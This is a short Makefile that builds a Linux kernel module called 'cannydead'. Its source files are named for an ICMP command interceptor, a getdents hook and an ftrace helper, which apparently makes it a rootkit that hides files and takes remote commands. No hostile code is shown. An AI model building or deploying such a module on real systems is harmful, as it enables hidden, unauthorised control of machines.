KERNELDIR := /lib/modules/$(shell uname -r)/build

obj-m := cannydead.o
cannydead-objs := cannydead_main.o cannydead_icmp_command_interceptor.o cannydead_getdents_hook.o cannydead_ftrace_helper.o

all: cannydead.ko

cannydead.ko: cannydead_main.c cannydead_icmp_command_interceptor.c cannydead_getdents_hook.c
	make -C $(KERNELDIR) M=$(PWD) modules

clean:
	make -C $(KERNELDIR) M=$(PWD) clean